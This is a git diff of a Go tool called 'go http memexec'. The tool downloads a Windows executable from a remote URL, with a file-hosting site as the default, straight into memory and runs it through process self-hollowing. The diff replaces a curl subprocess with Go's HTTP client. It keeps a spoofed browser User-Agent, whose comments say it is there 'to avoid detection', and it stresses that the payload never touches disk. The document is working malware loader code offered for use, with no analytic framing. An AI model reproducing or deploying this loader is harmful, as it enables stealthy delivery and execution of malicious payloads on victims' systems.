@@ -2,34 +2,35 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"log"
+	"net/http"
 	"os"
-	"os/exec"
 	"strings"
+	"time"
 
 	runpe "runpe/gorunpe"
 )
 
 const (
-	// Default URL to download from if none provided
+	// Default URL to download from if none provided, configure this before build to point to your payload to avoid passing CLI flags on run
+
 	defaultDownloadURL = "https://tmpfiles.org/"
 	
-	// Project information
-	projectName = "Go Curl MemExec"
+	projectName = "go http memexec"
 	version     = "1.0.0"
 )
 
 func main() {
-	fmt.Printf("%s v%s - In-Memory PE File Execution\n", projectName, version)
-	
+
 	// Determine downloadURL based on command-line arguments
 	var downloadURL string
 	if len(os.Args) < 2 {
-		// No command-line argument for URL, use the hardcoded default
+
 		downloadURL = defaultDownloadURL
 		fmt.Printf("No download URL provided via command line. Using default: %s\n", defaultDownloadURL)
 	} else {
-		// Use the provided URL
+
 		downloadURL = os.Args[1]
 		// Basic URL validation
 		if !strings.HasPrefix(downloadURL, "http://") && !strings.HasPrefix(downloadURL, "https://") {
@@ -37,25 +38,43 @@ func main() {
 		}
 	}
 
-	// Download the PE file directly to memory using curl
-	// CRITICAL: Using -o - to output to stdout ensures the file NEVER touches disk
-	fmt.Printf("Downloading executable from: %s directly to memory...\n", downloadURL)
+	// http client to download the payload 
+	client := &http.Client{
+		Timeout: 30 * time.Second,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			// allow up to 10 redirects
+			if len(via) >= 10 {
+				return fmt.Errorf("too many redirects")
+			}
+			return nil
+		},
+	}
 	
-	// Configure curl to download directly to stdout (-o -), silently (-s), follow redirects (-L)
-	// and use a standard user agent to avoid detection
-	cmd := exec.Command(
-		"curl", 
-		"-s",                // Silent mode
-		"-L",                // Follow redirects
-		"-o", "-",           // Output to stdout (memory)
-		"-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
-		downloadURL,
-	)
+	// create the HTTP request with a standard user agent
+	req, err := http.NewRequest("GET", downloadURL, nil)
+	if err != nil {
+		log.Fatalf("Failed to create HTTP request: %v", err)
+	}
 	
-	// Execute curl and capture the output directly into memory
-	payload, err := cmd.Output()
+	// set a common User-Agent to avoid detection
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36")
+	
+	// Send the HTTP request
+	resp, err := client.Do(req)
 	if err != nil {
 		log.Fatalf("Failed to download payload: %v", err)
+	}
+	defer resp.Body.Close()
+	
+	// Check for successful HTTP status code
+	if resp.StatusCode != http.StatusOK {
+		log.Fatalf("HTTP request failed with status code: %d", resp.StatusCode)
+	}
+	
+	// Read the payload into memory
+	payload, err := io.ReadAll(resp.Body)
+	if err != nil {
+		log.Fatalf("Failed to read payload: %v", err)
 	}
 	
 	// Validate we actually got data
@@ -65,11 +84,11 @@ func main() {
 	
 	fmt.Printf("Downloaded %d bytes successfully into memory\n", len(payload))
 	
-	// CRITICAL: At this point, the payload exists ONLY in memory
+	// NOTE:  At this point, the payload exists ONLY in memory
 	// No temporary files were created during the download process
 	
 	// Execute the payload in memory using process self-hollowing
-	fmt.Println("Executing payload in memory without touching disk...")
+	fmt.Println("Executing payload in memory...")
 	err = runpe.ExecuteInMemory(payload)
 	if err != nil {
 		log.Fatalf("In-memory execution failed: %v", err)
